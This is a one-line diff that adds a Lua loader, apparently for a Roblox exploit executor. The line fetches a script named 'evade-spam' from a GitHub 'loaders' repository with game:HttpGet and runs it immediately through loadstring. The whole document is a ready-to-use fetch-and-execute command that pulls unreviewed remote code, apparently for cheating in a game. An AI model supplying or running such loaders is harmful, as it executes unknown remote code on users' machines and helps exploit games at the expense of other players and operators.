@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/hlwn-evade-spam1-9mq611b7guvzih.lua"))()
